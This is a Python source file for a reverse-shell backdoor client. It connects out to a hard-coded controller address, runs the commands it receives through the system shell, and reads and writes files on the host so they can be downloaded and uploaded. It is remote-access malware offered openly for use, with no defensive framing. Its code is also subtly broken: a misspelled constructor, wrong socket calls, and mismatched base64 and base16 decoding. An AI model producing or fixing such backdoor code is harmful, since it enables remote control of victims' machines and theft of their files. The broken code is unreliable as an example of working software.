import simplejson
import socket
import subprocess
import os
import base64

class SocketLongDistance:
    def __int__(self,ip,port):
        my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_connection.connect(ip, port)

    def command_run(self,command):
        return subprocess.check_output(command,shell=True)

    def json_send(self,data):
        jason_data=simplejson.dump(data)
        self.my_connection.send(jason_data.encode("utf-8"))

    def json_get(self):
        jason_data=""
        while True:
            try:
                jason_data = jason_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(jason_data)
            except ValueError:
                continue

    def execute_cd_command(self,directory):
        os.chdir(directory)
        return f"Changing directory to {directory}"

    def download_command_file_read(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def upload_command_file_write(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b16decode(content))
            return "Uploading OK"

    def start_connection(self):
        while True:
            command = self.json_get()
            try:
                if command[0] == "EXİT" or command[0] == "QUİT":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    output_command = self.execute_cd_command(command[1])
                elif command[0] == "download" and len(command) > 1:
                    output_command = self.download_command_file_read(command[1])
                elif command[0] == "upload" and len(command) > 1:
                    output_command = self.upload_command_file_write(command[1],command[2])
                else:
                    output_command = self.command_run(command)
            except Exception:
                output_command="Error"

            self.json_send(output_command)


my_socket_connection=SocketLongDistance("192.168.1.106",8080)
my_socket_connection.start_connection()

